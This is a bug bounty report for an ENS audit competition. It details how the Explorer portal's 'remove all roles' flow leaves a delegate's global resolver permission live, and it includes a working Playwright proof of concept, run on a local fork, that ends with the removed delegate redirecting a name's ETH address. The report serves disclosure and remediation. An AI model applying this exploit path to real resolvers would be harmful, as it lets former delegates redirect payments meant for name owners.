# 91768 w a critical remove user from all roles preserves global resolver authority

**Submitted on Sep 4th 2026 at 07:05:55 UTC by @sl90 for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #91768
* **Report Type:** Websites & Apps
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/portal>
* **Impacts:**
  * Causing the application to display or pre-fill an incorrect address, name, or transaction detail, so that a user sends funds or submits a transaction to an unintended recipient, such as: - resolving or rendering an ENS name to an attacker-controlled address - showing the wrong recipient or amount on a transaction the user then approves

## Description

## Summary

Explorer groups all resolver-role entries for an account into a single UI row, even though the entries can belong to different Enhanced Access Control resources. It then flattens their role bitmaps into one list and, if any name-scoped entry exists, silently chooses the first non-root name as the scope for every edit and for the **Remove user** action.

This is especially dangerous when a delegate has both a root role and a name-scoped role. The sidebar labels the row **Global roles (all names)** and the confirmation says it will **remove this user from all roles**, but Explorer constructs and asks the wallet to approve one `authorizeNameRoles(name, combinedBitmap, delegate, false)` call. It never calls `revokeRootRoles`, so the delegate's global permission survives.

In the browser PoC, the former delegate retained global `ROLE_SET_ADDR` after the owner completed the advertised remove-all flow and then successfully changed the controlled name's ETH address to the delegate address.

## Root cause

The defect is a loss of the `(account, resource, roleBitmap)` relationship between indexed state and signed calldata:

1. `apps/portal/src/lib/roles/resolverRoles.ts:179-220` keys the table model only by account. For every additional resource belonging to that account it appends the raw entry, appends the decoded roles to one flat list, and adds the display name to a set. No per-resource role map remains.
2. `apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx:165-173` consumes that flattened list and calculates `resolvedNames.find((n) => n !== '(root)') ?? ''`. Therefore a mixed root/name row always selects a name, even while the UI displays “Global roles (all names).”
3. `ResolverRolesSidebar.tsx:307-322` passes that one selected name and the flattened union of every role to the remove action. The dialog at `:443-447` claims the user will be removed from all roles.
4. `apps/portal/src/features/resolver/helpers/revokeResolverRoles.ts:45-61` interprets an empty name as root but any nonempty name as `scope: 'name'`. The resulting calldata is `authorizeNameRoles(...)`, it cannot touch the root resource.
5. The same lossy model is also used by the save path at `ResolverRolesSidebar.tsx:190-237,295-304`, so mixed-resource grants and revocations can be applied to the wrong name even without using Remove.

The on-chain resolver behaves correctly. Explorer supplies the wrong resource and function because the frontend collapsed distinct authorization scopes.

## Exploit scenario and impact

1. A resolver owner gives a delegate global address-management permission and a narrower role on one name. This is a supported configuration exposed by Explorer's own root/name role controls.
2. The relationship ends or the delegate is suspected compromised. The owner opens the resolver role page, chooses the delegate, clicks **Remove user**, sees “Global roles (all names),” accepts the statement “remove this user from all roles,” and approves the transaction in the connected wallet.
3. Explorer submits only a name-scoped revocation. The transaction succeeds and its removal modal completes, but the global role remains live.
4. The former delegate continues to write address records for every name using that resolver. It can redirect resolution and receive assets or traffic sent using those names after the owner reasonably believes access was revoked.

The PoC used a benign `ROLE_SET_TEXT` on one name and the security-sensitive root `ROLE_SET_ADDR`. Explorer asked the victim wallet to sign:

```
authorizeNameRoles(
  dnsEncode("resolver-revoke-all-1788468051.eth"),
  17,                         // ROLE_SET_ADDR | ROLE_SET_TEXT
  0x709979...79C8,
  false
)
```

After that successful transaction, `hasRoles(nameResource, ROLE_SET_TEXT, delegate)` was false but `hasRootRoles(ROLE_SET_ADDR, delegate)` was still true. The delegate then called `setAddr(node, 60, delegate)` successfully, and the resolver returned the delegate address.

## Severity

Critical is appropriate under the competition's impact list because the normal Explorer confirmation induces the connected owner wallet to approve an unintended name/resource-specific transaction in place of the promised global revocation. The wrong transaction detail leaves security-sensitive authority live, and the browser PoC uses that authority to redirect an actual controlled ENS name immediately after the apparent removal.

This does not require a compromised wallet, malicious indexer, contract bug, browser exploit, or malformed calldata. The attacker begins as an authorized delegate, the victim performs an ordinary offboarding/revocation operation, and all post-confirmation exploitation is possible solely because Explorer signs the wrong scope.

## Preconditions

* One PermissionedResolver is used for at least one ENS name.
* The same delegate has at least one root role and at least one name-scoped role on that resolver.
* An owner/admin uses Explorer's resolver role page to remove that delegate and confirms the transaction.
* At least one surviving root role permits a meaningful write. The PoC uses `ROLE_SET_ADDR`, the most direct resolution-integrity example.

## Suggested fix

1. Preserve resolver scope in the UI model. Group/edit rows by `(account, resource)` or store a nested `Map<resource, roleBitmap>`, never flatten roles from different resources into one editable bitmap.
2. Replace the empty-name sentinel with an explicit discriminated scope such as `{ type: 'root' } | { type: 'name', name }`. The action should not infer a security boundary from display strings.
3. Make **Remove user from all roles** enumerate the delegate's live role entries and revoke each exact resource. Use `revokeRootRoles` for resource zero and `authorizeNameRoles(..., false)` for each name. Prefer one atomic resolver multicall, or clearly present and confirm every required transaction.
4. Before requesting a wallet signature, show the exact scopes and role bitmaps, and optionally re-read them from the chain to avoid stale indexer state.
5. Add regression tests covering root+name, multiple names, overlapping role bitmaps, and ordering changes in the indexer response. Assert both decoded calldata and post-transaction `hasRootRoles`/`hasRoles` state.
6. Separately correct the edit-page authorization gate: it currently treats root `ROLE_SET_ADDR` as permission to manage roles, rather than checking the relevant admin bit(s). The PoC uses the resolver owner with all admin roles, so it does not depend on that adjacent issue.

## Duplicate analysis

No disclosed issue covers role entries being merged across Enhanced Access Control resources or a remove-all operation silently preserving root roles.

* `QA-01`, `WEB-1257`, and `WEB-1305` concern role combinations during name transfer and follow-up profile/primary-name failures.
* `WEB-1249` concerns replacing a child registry during subname creation.
* `R2-06` concerns browser-only revocation of an HCA session/co-owner, not resolver delegate revocation or wrong resolver-role calldata.
* Basic chain/from binding reports (`EXP-4337-002` and `EXP-4337-003`) do not cover the correct signer approving an operation whose resource/selector is inconsistent with Explorer's own confirmation.

The distinct root cause is Explorer's account-only aggregation of resource-scoped role state and its first-non-root scope selection. The concrete consequence is retained global authority and demonstrated name redirection after a successful, owner-approved remove-all flow.

## Proof of Concept

## Proof of concept

### What the PoC proves

The test is self-contained on an isolated Sepolia fork. It:

1. Creates a fresh researcher-owned ENSv2 name and dedicated PermissionedResolver using the repository's E2E fixture
2. Gives a separate delegate root `ROLE_SET_ADDR` and name-scoped `ROLE_SET_TEXT` on-chain
3. Mocks only the indexer's resolver-overview response with those exact seeded entries
4. Connects the owner wallet to the frozen Explorer and executes its visible remove-all flow
5. Finds and decodes the wallet-approved transaction
6. Proves only the name role disappeared and the root role survived
7. Sends a real resolver write from the removed delegate and proves the name's ETH record now resolves to it

All permission reads, name/resolver creation, wallet authorization, transaction submission, receipt checks, calldata decoding, and final record reads are real on-chain operations against the local fork.

### Run

Start the repository's Anvil Sepolia fork on `127.0.0.1:28545` and the frozen Portal on `127.0.0.1:3001`, then from `audit-comp-ens/e2e` run:

```bash
ANVIL_RPC_URL=http://127.0.0.1:28545 \
PORTAL_APP_URL=http://127.0.0.1:3001 \
./node_modules/.bin/playwright test \
  -c ../../notes/ens-audit-competition-2026/pocs/playwright.resolver-root-role-revocation.config.mjs
```

### Embedded PoC

Save as `notes/ens-audit-competition-2026/pocs/resolver-root-role-revocation-browser-poc.spec.mjs`:

```js
/**
 * Browser PoC: Explorer merges a delegate's root and name-scoped resolver
 * roles, then its "Remove user from all roles" action revokes only the first
 * non-root name resource. The root role survives and can redirect the name.
 */
import { dirname, resolve } from 'node:path'
import { fileURLToPath } from 'node:url'
import { getResolver } from '../../../audit-comp-ens/e2e/node_modules/@ensdomains/ensjs/dist/exports/public.js'
import {
  decodeFunctionData,
  encodeFunctionData,
  encodePacked,
  getAddress,
  keccak256,
  namehash,
  parseAbi,
  zeroHash,
} from '../../../audit-comp-ens/e2e/node_modules/viem/_esm/index.js'
import { packetToBytes } from '../../../audit-comp-ens/e2e/node_modules/viem/_esm/ens/index.js'
import { privateKeyToAccount } from '../../../audit-comp-ens/e2e/node_modules/viem/_esm/accounts/index.js'
import {
  connectWithHeadlessWallet,
  expect,
  test,
} from '../../../audit-comp-ens/e2e/fixtures/playwright.portal.fixture.js'
import {
  publicClient,
  walletClient,
} from '../../../audit-comp-ens/e2e/helpers/anvil-client.js'
import { authorizeTransaction } from '../../../audit-comp-ens/e2e/helpers/portal-auth.js'

const here = dirname(fileURLToPath(import.meta.url))
const evidenceDir = resolve(here, 'evidence')
const portalUrl = process.env.PORTAL_APP_URL ?? 'http://127.0.0.1:3001'

const ROOT_RESOURCE = zeroHash
const ROLE_SET_ADDR = 1n
const ROLE_SET_TEXT = 16n

const resolverAbi = parseAbi([
  'function grantRootRoles(uint256 roles, address account)',
  'function authorizeNameRoles(bytes name, uint256 roles, address account, bool grant)',
  'function hasRootRoles(uint256 roles, address account) view returns (bool)',
  'function hasRoles(uint256 resource, uint256 roles, address account) view returns (bool)',
  'function setAddr(bytes32 node, uint256 coinType, bytes addr)',
  'function addr(bytes32 node, uint256 coinType) view returns (bytes)',
])

const wait = (hash) => publicClient.waitForTransactionReceipt({ hash })

const installResolverOverviewMock = async (
  page,
  { name, resolver, node, nameResource, owner, delegate },
) => {
  const response = {
    data: {
      resolver: {
        id: resolver.toLowerCase(),
        address: resolver,
        nodeCount: 1,
        aliasCount: 0,
        roleHolderCount: 1,
        nodes: [
          {
            id: node,
            name,
            owner: { id: owner.address.toLowerCase() },
            resolver: { id: resolver.toLowerCase(), address: resolver },
          },
        ],
        aliases: [],
        roles: [
          {
            account: delegate.address.toLowerCase(),
            resource: ROOT_RESOURCE,
            roleBitmap: ROLE_SET_ADDR.toString(),
            blockNumber: 1,
            transactionHash: null,
            timestamp: null,
            name: null,
          },
          {
            account: delegate.address.toLowerCase(),
            resource: nameResource,
            roleBitmap: ROLE_SET_TEXT.toString(),
            blockNumber: 2,
            transactionHash: null,
            timestamp: null,
            name,
          },
        ],
        events: [],
      },
    },
  }

  await page.route(
    /:5655\/graphql(?!\.)|\/indexer\/graphql(?!\.)|staging-graphql\.ens\.dev/,
    async (route) => {
      const body = route.request().postDataJSON()
      if (body?.query?.includes('getResolverOverview')) {
        await route.fulfill({ status: 200, json: response })
      } else {
        await route.fulfill({ status: 200, json: { data: {} } })
      }
    },
  )
}

test('remove all roles leaves the delegate root role active', async ({
  portalPage: page,
  wallet,
  accounts,
  makeName,
}) => {
  test.setTimeout(240_000)

  const owner = privateKeyToAccount(accounts.getPrivateKey('user'))
  const delegate = privateKeyToAccount(accounts.getPrivateKey('user2'))
  const name = await makeName({
    label: 'resolver-revoke-all',
    owner: 'user',
    records: [{ key: 'description', value: 'resolver role revocation PoC' }],
  })
  const discoveredResolver = await getResolver(publicClient, { name })
  if (!discoveredResolver) throw new Error('PoC name has no resolver')
  const resolver = getAddress(discoveredResolver)
  const dnsName = `0x${Buffer.from(packetToBytes(name)).toString('hex')}`
  const node = namehash(name)
  const nameResource = keccak256(
    encodePacked(['bytes32', 'bytes32'], [node, zeroHash]),
  )

  // Controlled precondition: one global address-writing role plus one
  // name-scoped text-writing role for the same delegate.
  await wait(
    await walletClient.sendTransaction({
      account: owner,
      to: resolver,
      data: encodeFunctionData({
        abi: resolverAbi,
        functionName: 'grantRootRoles',
        args: [ROLE_SET_ADDR, delegate.address],
      }),
    }),
  )
  await wait(
    await walletClient.sendTransaction({
      account: owner,
      to: resolver,
      data: encodeFunctionData({
        abi: resolverAbi,
        functionName: 'authorizeNameRoles',
        args: [dnsName, ROLE_SET_TEXT, delegate.address, true],
      }),
    }),
  )
  await wait(
    await walletClient.sendTransaction({
      account: owner,
      to: resolver,
      data: encodeFunctionData({
        abi: resolverAbi,
        functionName: 'setAddr',
        args: [node, 60n, owner.address],
      }),
    }),
  )

  const rootBefore = await publicClient.readContract({
    address: resolver,
    abi: resolverAbi,
    functionName: 'hasRootRoles',
    args: [ROLE_SET_ADDR, delegate.address],
  })
  const nameBefore = await publicClient.readContract({
    address: resolver,
    abi: resolverAbi,
    functionName: 'hasRoles',
    args: [BigInt(nameResource), ROLE_SET_TEXT, delegate.address],
  })
  expect(rootBefore).toBe(true)
  expect(nameBefore).toBe(true)

  await installResolverOverviewMock(page, {
    name,
    resolver,
    node,
    nameResource,
    owner,
    delegate,
  })
  await connectWithHeadlessWallet(page, wallet)
  await page.goto(`${portalUrl}/resolver/${resolver}/roles`)

  await expect(page.getByRole('heading', { name: 'Roles' })).toBeVisible()
  await page.getByRole('button', { name: 'Edit user roles' }).click()
  await expect(page.getByText('Global roles (all names)')).toBeVisible()

  await page.getByRole('button', { name: 'Remove user' }).click()
  const confirm = page
    .locator('[data-slot="dialog-content"]')
    .filter({ hasText: 'remove this user from all roles' })
  await expect(confirm).toBeVisible()
  await page.screenshot({
    path: resolve(evidenceDir, 'resolver-remove-all-before-confirm.png'),
    fullPage: true,
  })
  await confirm.getByRole('button', { name: 'Remove' }).click()

  const modal = page
    .locator('[data-slot="dialog-content"]')
    .filter({ hasText: 'Remove resolver user' })
  await expect(modal).toBeVisible()
  const preSubmissionBlock = await publicClient.getBlockNumber({ cacheTime: 0 })
  await modal.getByRole('button', { name: 'Start', exact: true }).click()
  await modal.getByRole('button', { name: 'Open wallet', exact: true }).click()

  await authorizeTransaction(wallet)

  await expect
    .poll(
      () =>
        publicClient.readContract({
          address: resolver,
          abi: resolverAbi,
          functionName: 'hasRoles',
          args: [BigInt(nameResource), ROLE_SET_TEXT, delegate.address],
        }),
      { timeout: 60_000 },
    )
    .toBe(false)

  const rootAfter = await publicClient.readContract({
    address: resolver,
    abi: resolverAbi,
    functionName: 'hasRootRoles',
    args: [ROLE_SET_ADDR, delegate.address],
  })
  expect(rootAfter).toBe(true)

  const postSubmissionBlock = await publicClient.getBlockNumber({ cacheTime: 0 })
  let removalTransaction
  for (
    let blockNumber = preSubmissionBlock + 1n;
    blockNumber <= postSubmissionBlock;
    blockNumber++
  ) {
    const block = await publicClient.getBlock({
      blockNumber,
      includeTransactions: true,
    })
    removalTransaction = block.transactions.find(
      (transaction) =>
        transaction.from.toLowerCase() === owner.address.toLowerCase() &&
        transaction.to?.toLowerCase() === resolver.toLowerCase(),
    )
    if (removalTransaction) break
  }
  if (!removalTransaction) throw new Error('Removal transaction not found')

  const decoded = decodeFunctionData({
    abi: resolverAbi,
    data: removalTransaction.input,
  })
  expect(decoded.functionName).toBe('authorizeNameRoles')
  expect(decoded.args).toEqual([
    dnsName,
    ROLE_SET_ADDR | ROLE_SET_TEXT,
    delegate.address,
    false,
  ])

  // The supposedly removed delegate still has global ROLE_SET_ADDR and can
  // redirect the controlled name after the owner-approved revocation.
  const redirectReceipt = await wait(
    await walletClient.sendTransaction({
      account: delegate,
      to: resolver,
      data: encodeFunctionData({
        abi: resolverAbi,
        functionName: 'setAddr',
        args: [node, 60n, delegate.address],
      }),
    }),
  )
  const addrAfter = await publicClient.readContract({
    address: resolver,
    abi: resolverAbi,
    functionName: 'addr',
    args: [node, 60n],
  })
  const resolvedAfter = getAddress(`0x${addrAfter.slice(-40)}`)
  expect(redirectReceipt.status).toBe('success')
  expect(resolvedAfter).toBe(delegate.address)

  await page.screenshot({
    path: resolve(evidenceDir, 'resolver-remove-all-after-success.png'),
    fullPage: true,
  })

  console.log(
    JSON.stringify({
      reproduced: true,
      name,
      resolver,
      owner: owner.address,
      delegate: delegate.address,
      uiClaim: 'Global roles (all names); remove this user from all roles',
      signedFunction: decoded.functionName,
      signedName: name,
      signedRoleBitmap: (ROLE_SET_ADDR | ROLE_SET_TEXT).toString(),
      rootRoleBefore: rootBefore,
      rootRoleAfter: rootAfter,
      nameRoleBefore: nameBefore,
      nameRoleAfter: false,
      removalTransactionHash: removalTransaction.hash,
      redirectTransactionHash: redirectReceipt.transactionHash,
      resolvedAfter,
    }),
  )
})
```

### Embedded Playwright config

```js
export default {
  testDir: '.',
  testMatch: /resolver-root-role-revocation-browser-poc\.spec\.mjs$/,
  fullyParallel: false,
  workers: 1,
  retries: 0,
  timeout: 240_000,
  expect: { timeout: 20_000 },
  outputDir: '/tmp/ens-resolver-role-revocation-results',
  use: {
    baseURL: 'http://127.0.0.1:3001',
    actionTimeout: 60_000,
    navigationTimeout: 60_000,
    trace: 'on',
    video: 'off',
    screenshot: 'only-on-failure',
    launchOptions: {
      executablePath: '/usr/bin/google-chrome',
      args: ['--no-sandbox', '--disable-setuid-sandbox'],
    },
  },
}
```

### Observed output

```
name: resolver-revoke-all-1788468051.eth
resolver: 0x0473a6756DBA3dB15B10077f4F8f240C0616BadD
owner: 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266
delegate: 0x70997970C51812dc3A010C7d01b50e0d17dc79C8
UI: Global roles (all names); remove this user from all roles
signed function: authorizeNameRoles
signed role bitmap: 17
root ROLE_SET_ADDR before: true
root ROLE_SET_ADDR after:  true
name ROLE_SET_TEXT before: true
name ROLE_SET_TEXT after:  false
removal tx: 0xcb56e2644b0063ffc13dd06e455fc84a3ad0ce145b7a2bd8298650253c6316be
redirect tx: 0x31c47250930c6d420ae811252b29ef43cc6fd10c6b8a6085942d7186d668b963
resolved address after: 0x70997970C51812dc3A010C7d01b50e0d17dc79C8
1 passed
```

Screenshots are attached as:

* `resolver-remove-all-before-confirm.png`
* `resolver-remove-all-after-success.png`
